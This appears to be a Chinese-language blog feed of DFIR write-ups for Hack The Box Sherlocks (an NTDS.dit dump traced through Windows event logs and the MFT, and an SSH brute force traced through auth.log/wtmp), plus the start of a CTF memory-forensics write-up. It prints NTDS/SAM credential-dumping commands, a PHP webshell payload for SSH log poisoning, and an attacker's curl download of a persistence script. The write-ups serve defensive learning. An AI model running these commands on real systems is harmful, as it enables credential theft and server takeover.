href="#Security-evtx" class="headerlink" title="Security.evtx"></a>Security.evtx</h4><div class="table-container"><table><thead><tr><th>Event ID</th><th>Description</th></tr></thead><tbody><tr><td><strong>4624</strong></td><td><strong>表示用户成功登录系统</strong><br>但是要关注一下Logon Type的类型<br>2代表本地的交互式登录<br>3代表网络登录<br>10表示远程桌面登录</td></tr><tr><td>4625</td><td>表示用户尝试登录系统但未成功，可以从中识别暴力破解</td></tr><tr><td>4768</td><td>Kerberos 身份验证票据（TGT）请求</td></tr><tr><td>4769</td><td>Kerberos 服务票据（TGS）请求</td></tr><tr><td>4770</td><td>Kerberos 服务票据的续订<br>上面的三条用来检测可疑的Kerberos 活动</td></tr><tr><td>4776</td><td>NTLM 身份验证尝试的结果，检测横向移动或凭据滥用</td></tr><tr><td>4720</td><td>表示系统中创建了新用户，检测攻击者是否在系统中留下了后门账户</td></tr><tr><td>4722</td><td>表示已重新启用被禁用的账户，攻击者可能重新启用管理员账户</td></tr><tr><td>4726</td><td>表示系统中某账户被删除，攻击者可能试图清除痕迹</td></tr><tr><td>4732 / 4733</td><td>用户添加到组 / 从组移除，检测特权提升操作</td></tr><tr><td>4670</td><td>表示文件或对象的权限被更改，检测攻击者可能修改文件或注册表权限以维持持久性</td></tr></tbody></table></div><h4 id="System-evtx"><a href="#System-evtx" class="headerlink" title="System.evtx"></a>System.evtx</h4><div class="table-container"><table><thead><tr><th>Event ID</th><th>Description</th></tr></thead><tbody><tr><td>7045</td><td>表示系统中安装了一个新服务，用于检测恶意服务的安装和启动</td></tr><tr><td>7034</td><td>表示服务异常终止，如终止系统的防护服务</td></tr><tr><td>6005 / 6006</td><td>系统启动 / 关机</td></tr><tr><td>1102</td><td>表示安全日志被清除，攻击者销毁痕迹</td></tr></tbody></table></div><h4 id="Application-evtx"><a href="#Application-evtx" class="headerlink" title="Application.evtx"></a>Application.evtx</h4><div class="table-container"><table><thead><tr><th>Event ID</th><th>Description</th></tr></thead><tbody><tr><td>4104</td><td>表示 PowerShell 脚本被执行，检测可疑的 PowerShell 活动</td></tr><tr><td>4004</td><td>Windows Defender检测到威胁</td></tr><tr><td>4005</td><td>威胁被隔离<br>上面两条用于用于识别是否有恶意软件被防病毒程序捕获</td></tr></tbody></table></div><h4 id="Microsoft-Windows-TaskScheduler"><a href="#Microsoft-Windows-TaskScheduler" class="headerlink" title="Microsoft-Windows-TaskScheduler"></a>Microsoft-Windows-TaskScheduler</h4><div class="table-container"><table><thead><tr><th>Event ID</th><th>Description</th></tr></thead><tbody><tr><td><strong>106</strong></td><td>表示创建了新的计划任务，检测常见的计划任务持久化</td></tr><tr><td>140</td><td>表示现有的计划任务被修改，检测是否有合法的计划任务被修改用于恶意目的</td></tr></tbody></table></div><p>依据<a href="https://www.hackthebox.com/blog/ntds-dumping-attack-detection">NTDS dumping attack detection</a>这篇文章在这个挑战中我们将会用到下面的几个事件ID</p><p>首先我们的事件源限定在ESENT中，其中的事件ID325和327分别在创建新数据库和分离数据库时记录这些事件。两者的描述分别如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The database engine created a new database....</span><br><span class="line"></span><br><span class="line">The database engine detached a database....</span><br></pre></td></tr></table></figure><blockquote><p><strong>事件源 “ESENT”</strong> 是 Windows 事件日志中与 <strong>Extensible Storage Engine (ESE)</strong> 相关的事件源。ESE 是 Microsoft 的高性能、事务型数据库引擎，被许多 Windows 组件和应用程序用来管理数据存储和访问。我们的Active Directory服务用它来存储目录信息，例如用户、组和计算机对象。</p></blockquote><p>事件ID 7036由 <strong>服务控制管理器 (Service Control Manager)</strong> 生成的，记录在系统日志中，表示服务的启动或停止状态发生了变化。事件描述如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The [Service Name] service entered the [state] state.</span><br></pre></td></tr></table></figure><p>事件ID 4799当某个进程枚举（列出）计算机或设备上某个<strong>启用了安全功能的本地组</strong>的成员时，会生成此事件。或者说尝试获取某个本地组（如 <code>Administrators</code> 组）的成员信息时。</p><p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4799?source=post_page-----2efb81522f2c--------------------------------">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4799?source=post_page-----2efb81522f2c--------------------------------</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A security-enabled local group membership was enumerated.</span><br></pre></td></tr></table></figure><h3 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h3><p><strong>NTDS.dit</strong> 是 Windows 域控制器的核心数据库文件，存储了AD中的重要信息，存储了所有域控制器的目录服务数据，如用户账户、组信息和计算机对象。具体包括下面的内容：</p><ul><li>存储 Active Directory 对象：用户账户、计算机账户、组、组织单位 (OU) 等。</li><li>存储身份验证凭据：包括用户的密码哈希 (如 NTLM、Kerberos 密钥等)。</li><li>存储安全策略：如组策略对象 (GPO) 和权限信息。</li><li>等等</li></ul><p>我们之前说过我们的事件源来自<strong>ESENT</strong>，这是因为该文件采用了 <strong>Extensible Storage Engine (ESE)</strong> 数据库技术，支持高效的数据检索和写入。</p><p>NTDS.dit文件为LDAP提供底层支持，因此要访问和查询NTDS.dit通常需要专门的工具如ldapsearch或者ntdsutil等等。</p><p>非域环境中也有存储着当前主机用户的密码信息的SAM文件，但是他们都需要SYSTEM文件进行解密，他们的路径分别如下：</p><ul><li><code>NTDS.dit</code>文件位置: <code>C:\Windows\NTDS\NTDS.dit</code></li><li><code>SYSTEM</code>文件位置:<code>C:\Windows\System32\config\SYSTEM</code></li><li><code>SAM</code>文件位置:<code>C:\Windows\System32\config\SAM</code></li></ul><p>注：<code>SYSTEM</code>文件和<code>HKEY_LOCAL_MACHINE\SYSTEM</code>注册表配置单元是同一个数据源，只是表现形式不一样</p><h4 id="常见攻击方式"><a href="#常见攻击方式" class="headerlink" title="常见攻击方式"></a>常见攻击方式</h4><p>在Active Directory服务运行时<code>NTDS.dit</code>被锁定（不允许被复制），但仍然具有非常多的方式提取<code>NTDS.dit</code>文件，这里仅做简单介绍，以后有机会补充</p><p> <strong>Volume Shadow Copy Service (VSS)</strong></p><p>卷影副本技术绕过文件锁定机制进行提取</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /<span class="keyword">for</span>=C:</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .</span><br></pre></td></tr></table></figure><p>对SYSTEM文件的提取也类似</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hiv</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hiv</span><br></pre></td></tr></table></figure><p> <strong>NTDSUTIL.exe</strong></p><p><code>NTDSUTIL</code> 是一个用于管理和维护 Active Directory 域控制器的命令行工具，主要用于进行数据库操作、恢复、备份、清理活动目录等任务。</p><p>关于此工具的详细操作可参考<a href="https://www.cnblogs.com/suv789/p/18356208">https://www.cnblogs.com/suv789/p/18356208</a></p><p>利用如下命令进行副本的复制</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil <span class="string">&quot;ac i ntds&quot;</span> <span class="string">&quot;ifm&quot;</span> <span class="string">&quot;create full c:\ADBackup&quot;</span> q q</span><br></pre></td></tr></table></figure><p>之后会在C盘下创建ADBackup文件夹，文件夹中存有<code>SYSTEM</code>文件和<code>NTDS.dit</code>文件</p><p><strong>工具提取</strong></p><p>例如使用netexec进行NTDS文件提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb IP -u username -p password --ntds</span><br></pre></td></tr></table></figure><p>更多的提取方式可参考<a href="https://blog.csdn.net/Ping_Pig/article/details/108914583">https://blog.csdn.net/Ping_Pig/article/details/108914583</a></p><p>在本地利用Impacket工具包的secretsdump.py进行密码提取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -ntds ntds.dit -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><h3 id="MFT"><a href="#MFT" class="headerlink" title="MFT"></a>MFT</h3><p>MFT（Master File Table，主文件表），用于存储文件和目录的元数据。每个 NTFS 卷都包含一个 $MFT，它是 NTFS 文件系统的关键部分。</p><p>MFT包含以下信息：</p><ul><li>文件和目录的属性：包括权限、所有者、创建时间、修改时间、访问时间等。</li><li>文件数据的物理位置：MFT记录了文件数据在磁盘上的存储位置。</li><li>文件名：MFT中存储了文件和目录的名称。</li></ul><blockquote><p>注：</p><ul><li>即使文件被删除，$MFT 条目可能仍然保留，可以通过分析条目恢复被删除的文件。</li><li>通过分析 $MFT，可以追踪文件的创建、修改和删除活动。</li><li>删除文件的 $MFT 条目通常会被标记为未使用，但实际数据可能尚未被覆盖。</li><li>文件数据驻留在 $MFT 中时，不会占用磁盘空间，可能被用于隐藏恶意文件。</li></ul></blockquote><h3 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h3><p>我们首先要确定卷影复制服务进入运行状态的时间，在<code>SYSTEM.evtx</code>中寻找事件ID为7036的事件，然后搜索<code>volumn shadow copy</code>服务</p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124222908.png" alt="微信截图_20250124222908"></p><p>这里需要注意一下我们和HTB总部英国是存在8小时时差的，因此我们得到的结果需要减去8个小时才是我们的答案</p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124223744.png" alt="微信截图_20250124223744"></p><p><strong>Answer：2024-05-14 03:42:16</strong></p><h3 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h3><p>找到卷影复制进程查询的两个用户组以及执行该操作的计算机帐户，在<code>Security.evtx</code>中筛选4799事件，并查找卷影服务进程<code>VSSVC.exe</code></p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124224912.png" alt="微信截图_20250124224912"></p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124224947.png" alt="微信截图_20250124224947"></p><p>答案很明显</p><p><strong>Answer：Administrators, Backup Operators, DC01$</strong></p><h3 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h3><p>卷影复制服务进程ID的10进制</p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124225122.png" alt="微信截图_20250124225122"></p><p>Answer：4,496</p><h3 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h3><p>提取卷影副本时分配的卷 ID/GUID 值，在<code>Microsoft-Windows-NTFS.evtx</code>中过滤事件ID 4，这标志着NTFS 卷已成功挂载，找到ShadowCopy即可</p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124230156.png" alt="微信截图_20250124230156"></p><p><strong>Answer：{06c4a997-cca8-11ed-a90f-000c295644f9}</strong></p><h3 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h3><p>转储的 NTDS 数据库的完整路径，利用Eric Zimmerman个人网站中的MFT Explorer打开MFT文件</p><p>或者使用MFTECmd</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MFTECmd.exe <span class="operator">-f</span> <span class="string">&quot;&lt;Path-to-<span class="variable">$MFT</span>&gt;&quot;</span> <span class="literal">--csv</span> <span class="string">&quot;&lt;Path-to-Output.csv&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124232308.png" alt="微信截图_20250124232308"></p><p><strong>Answer：C:\Users\Administrator\Documents\backup_sync_Dc\Ntds.dit</strong></p><h3 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h3><p>新转储的 ntds.dit 是什么时候在磁盘上创建的，在我们上面的页面的右下角</p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124232458.png" alt="微信截图_20250124232458"></p><p><strong>Answer：2024-05-14 03:44:22</strong></p><h3 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h3><p>转储了哪个注册表配置单元以及其文件大小（以字节为单位）是多少</p><p>这个就是我们上面说的<code>SYSTEM.hive</code>了</p><p><img src="/2025/01/22/HTB-CrownJewel-1/微信截图_20250124232800.png" alt="微信截图_20250124232800"></p><p><strong>Answer：SYSTEM, 17563648</strong></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFIR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Brutus</title>
      <link href="/2025/01/21/HTB-Brutus/"/>
      <url>/2025/01/21/HTB-Brutus/</url>
      
        <content type="html"><![CDATA[<p><img src="/2025/01/21/HTB-Brutus/Brutus.png" alt="Brutus"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sherlock Scenario</span><br><span class="line"></span><br><span class="line">In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We&#x27;ll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.</span><br></pre></td></tr></table></figure><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?</span><br><span class="line"></span><br><span class="line"><span class="bullet">2.</span> The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">3.</span> Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?</span><br><span class="line"></span><br><span class="line"><span class="bullet">4.</span> SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker&#x27;s session for the user account from Question 2?</span><br><span class="line"></span><br><span class="line"><span class="bullet">5.</span> The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">6.</span> What is the MITRE ATT&amp;CK sub-technique ID used for persistence by creating a new account?</span><br><span class="line"></span><br><span class="line"><span class="bullet">7.</span> What time did the attacker&#x27;s first SSH session end according to auth.log?</span><br><span class="line"></span><br><span class="line"><span class="bullet">8.</span> The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>题目给出了两个附件一个<code>auth.log</code>，一个<code>wtmp</code>，先介绍一下这两个文件</p><h3 id="auth-log"><a href="#auth-log" class="headerlink" title="auth.log"></a>auth.log</h3><p>用于记录所有与用户认证相关的日志，包括常见的SSH远程登录，利用sudo提升权限执行命令等都会产生记录</p><p><strong>Debian/Ubuntu 系列位于</strong>:  <code>/var/log/auth.log</code></p><p><strong>Red Hat/CentOS/Fedora系列位于</strong>: <code>/var/log/secure</code></p><p>日志每行的格式如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">Timestamp</span>&gt;</span></span> <span class="language-xml"><span class="tag">&lt;<span class="name">Hostname</span>&gt;</span></span> <span class="language-xml"><span class="tag">&lt;<span class="name">Service</span>&gt;</span></span>[<span class="language-xml"><span class="tag">&lt;<span class="name">process_id</span>&gt;</span></span>]: <span class="language-xml"><span class="tag">&lt;<span class="name">Message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们取出一行数据进行对比</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure><p>日志说明用户 <code>cyberjunkie</code> 从 <code>65.2.161.68</code> 通过 SSH 登录到名为 <code>ip-172-31-35-28</code> 的服务器，并成功通过密码认证。</p><h4 id="常见事件类型"><a href="#常见事件类型" class="headerlink" title="常见事件类型"></a>常见事件类型</h4><h5 id="SSH登录相关"><a href="#SSH登录相关" class="headerlink" title="SSH登录相关"></a>SSH登录相关</h5><p><strong>成功</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br></pre></td></tr></table></figure><p><strong>失败</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed password for invalid user server<span class="emphasis">_adm from 65.2.161.68 port 46698 ssh2</span></span><br></pre></td></tr></table></figure><p><strong>爆破</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Failed password for root from 65.2.161.68 port 46852 ssh2</span><br><span class="line">Failed password for root from 65.2.161.68 port 46876 ssh2</span><br></pre></td></tr></table></figure><h5 id="账户活动"><a href="#账户活动" class="headerlink" title="账户活动"></a>账户活动</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow</span><br></pre></td></tr></table></figure><h5 id="系统服务认证"><a href="#系统服务认证" class="headerlink" title="系统服务认证"></a>系统服务认证</h5><p><strong>登录会话开始</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)</span><br></pre></td></tr></table></figure><p><strong>登录会话结束</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mar  6 06:18:01 ip-172-31-35-28 CRON[1118]: pam<span class="emphasis">_unix(cron:session): session closed for user confluence</span></span><br></pre></td></tr></table></figure><h4 id="筛选安全事件"><a href="#筛选安全事件" class="headerlink" title="筛选安全事件"></a>筛选安全事件</h4><p>其实从上面的不同事件的分析中就已经可以很轻松的提取出关键词进行筛选了，下面仅给出简单的示例</p><p><strong>筛选登录失败的记录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure><p><strong>筛选登录成功记录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted password&quot;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure><p><strong>统计来自某一 IP 的登录尝试</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/auth.log | grep <span class="string">&quot;192.168.1.100&quot;</span></span><br></pre></td></tr></table></figure><p>我们的log文件默认只有root账户可以访问，如果日志可读我们可以实现RCE，利用SSH可以实现向日志中写马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>attack<span class="string">&#x27;]);?&gt;&#x27;</span>@192.168.3.100</span><br></pre></td></tr></table></figure><p>然后读取日志利用attack这个参数值实现RCE即可</p><h3 id="wtmp"><a href="#wtmp" class="headerlink" title="wtmp"></a>wtmp</h3><p>说到<code>wtmp</code>文件就不得不提到另外两个文件了，<code>utmp</code>和<code>btmp</code></p><p>说一下三者的区别</p><p><code>wtmp</code>：是一个二进制文件，永久记录每个用户登录、注销及系统的启动、停机的事件。位于<code>/var/log/wtmp</code></p><p>读取<code>wtmp</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">last</span><br><span class="line"></span><br><span class="line">可以使用-f指定不同的wtmp备份</span><br><span class="line">或者last reboot查询系统最后一次的重启时间</span><br></pre></td></tr></table></figure><blockquote><p><strong>登录时间</strong>：用户登录的时间戳（从 1970 年 1 月 1 日开始的秒数）。</p><p><strong>登出时间</strong>：用户登出的时间戳，或“仍然登录”。</p><p><strong>终端号</strong>：用户登录时所用的终端（例如 <code>tty1</code>、<code>pts/1</code> 等）。</p><p><strong>主机名</strong>：用户登录时的远程主机地址（如果是远程登录）。</p><p><strong>登录状态</strong>：表示是否为登录或注销（例如用户登录时会有一个事件标记，注销时会有另一个事件标记）。</p><p><strong>用户名</strong>：登录的用户名。</p></blockquote><p><code>utmp</code>：记录当前登录的每个用户的信息。</p><p>读取<code>utmp</code>文件显示简略信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span></span><br></pre></td></tr></table></figure><p>读取<code>utmp</code>文件显示详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w</span><br></pre></td></tr></table></figure><p><code>btmp</code>：记录所有失败的登录尝试，包括远程主机，登录失败的原因，在检查暴力破解中还是比较有用的。</p><p>显示 <code>btmp</code> 文件中的失败登录记录(需要root权限)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure><p>可以利用下面的命令将三种文件均转化成人类可读格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utmpdump /var/log/wtmp</span><br></pre></td></tr></table></figure><blockquote><p><strong>输出列分别代表</strong></p><ul><li>Event Type</li><li>PID</li><li>Terminal ID</li><li>User</li><li>Host</li><li>IP Address</li><li>Timestamp</li></ul></blockquote><p>题目的日志记录还是比较少的，我们直接使用Notepad即可，</p><h3 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h3><p>攻击者IP很简单，直接找Failed的记录就行了</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121194804.png" alt="微信截图_20250121194804"></p><p><strong>Answer：65.2.161.68</strong></p><h3 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h3><p>爆破成功的用户直接找Accept即可</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121194958.png" alt="微信截图_20250121194958"></p><p>发现存在4次记录，第一次应该正常的用户登录，紧接着最近的一次成功记录就是我们要找的爆破成功记录，用户是root</p><p><strong>Answer：root</strong></p><h3 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h3><p>我们需要查找攻击者手动登录的时间戳，为什么会存在手动登录这一说法呢，我们先看下图</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121195423.png" alt="微信截图_20250121195423"></p><p>我们发现登陆成功和会话被移除时间间隔甚至不到一秒钟，这是因为暴力破解工具只检查登陆成功或失败的状态，然后记录成功的情况供攻击者稍后进行尝试。那么接下来我们只需要寻找下一次root账户的登录时间即可，这里我们也可以通过<code>wtmp</code>文件进行辅助</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121200045.png" alt="微信截图_20250121200045"></p><blockquote><p><strong>注</strong>：请注意这里的时间虽然和<code>auth.log</code>的内容稍有出入，但是实际上也是正确的，只是小时因为时区的问题会比<code>auth.log</code>中快上几小时</p></blockquote><p>可以发现从SSH开始验证用户身份的合法性到成功登录之间存在一秒钟的差别，这是正常现象，因为验证<code>/etc/shadow</code>文件中的哈希和启动交互式会话均需要花费时间</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121200632.png" alt="微信截图_20250121200632"></p><p>这里的时间以<code>wtmp</code>文件中的为准</p><p><strong>Answer: 2024-03-06 06:32:45</strong></p><h3 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h3><p>手动登陆时分配的会话号在登录日志里有</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121201144.png" alt="微信截图_20250121201144"></p><p><strong>Answer：37</strong></p><h3 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h3><p>为了实现权限持久化，攻击者创建了后门账户，我们在登陆后的账户活动中可以发现端倪</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121201706.png" alt="微信截图_20250121201706"></p><p>添加cyberjunkie到sudo组中，并授予其对<code>/etc/shadow</code>文件的访问权限</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121201819.png" alt="微信截图_20250121201819"></p><p><strong>Answer：cyberjunkie</strong></p><h3 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h3><p>用于持久化的MITRE ATT&amp;CK子技术 ID直接在MITRE ATT&amp;CK官网上查就行了</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121204220.png" alt="微信截图_20250121204220"></p><p><strong>Answer: T1136.001</strong></p><h3 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h3><p>根据 auth.log，攻击者的第一个 SSH 会话何时结束</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121204333.png" alt="微信截图_20250121204333"></p><p><strong>Answer：2024-03-06 06:37:24</strong></p><h3 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h3><p>攻击者在后门账户上利用高权限下载脚本的完整命令</p><p><img src="/2025/01/21/HTB-Brutus/微信截图_20250121204713.png" alt="微信截图_20250121204713"></p><p><strong>Answer：/usr/bin/curl <a href="https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh">https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFIR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八届西湖论剑easyrawencode</title>
      <link href="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/"/>
      <url>/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/</url>
      
        <content type="html"><![CDATA[<p>很遗憾比赛的时候没有做出来，主要是平常对AES-EAX加密模式基本上没什么了解，导致解密脚本写的有些问题，数据没有正常解密出来</p><p>题目给了内存，先确定一下profile</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f ~/Forensics/volatility2/volatility/easyrawencode.raw imageinfo </span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119122253.png" alt="微信截图_20250119122253"></p><p>然后查找一下可疑文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f ~/Forensics/volatility2/volatility/easyrawencode.raw filescan | grep -E <span class="string">&#x27;txt|png|jpg|gif|zip|rar|7z|pdf|doc&#x27;</span></span><br></pre></td></tr></table></figure><p>我们可以发现一个名为encrypted_data.zip的压缩包</p><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119123715.png" alt="微信截图_20250119123715"></p><p>我们现在其实可以大概确定题目的考察方向了，利用一个加密算法加密了一些数据，然后我们需要在内存中找到加密算法的参数，然后对encrypted_data进行解密</p><p>现在我们重新进行文件扫描，但是给路径限定到存在<strong>rsa</strong>的路径    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f ~/Forensics/volatility2/volatility/easyrawencode.raw --profile=Win7SP1x64 filescan | grep -i <span class="string">&quot;rsa&quot;</span> </span><br></pre></td></tr></table></figure><p><img src="/2025/01/19/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easyrawencode/微信截图_20250119124227.png" alt="微信截图_20250119124227"></p><p>提取红框中的三个文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 